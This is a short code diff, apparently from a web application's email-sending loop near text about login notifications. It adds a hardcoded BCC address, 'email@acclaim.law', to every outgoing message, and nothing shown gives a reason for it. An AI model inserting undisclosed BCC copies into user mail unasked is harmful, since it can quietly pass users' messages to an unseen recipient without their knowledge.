@@ -3483,6 +3483,7 @@ You can disable these login notifications in your Profile Settings.
           textContent,
           attachLogo: false, // already added to attachments
           attachments,
+          bcc: ['email@acclaim.law'],
         });
         if (ok) sent++; else failed++;
       } catch (e) {
